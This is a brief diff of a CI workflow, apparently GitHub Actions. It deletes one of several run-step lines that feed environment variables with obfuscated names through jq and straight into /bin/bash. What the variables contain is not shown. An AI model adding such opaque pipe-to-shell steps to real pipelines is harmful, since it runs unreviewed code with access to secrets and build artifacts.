@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$mhz2" | jq -r .zfc729 | /bin/bash
           printf '%s' "$q5400" | jq -r .zy5 | /bin/bash
-          echo $bjtc3511 | jq -r .b23257 | /bin/bash
           printf '%s' "$xws535" | jq -r .w2366 | /bin/bash
 
       - name: Store results
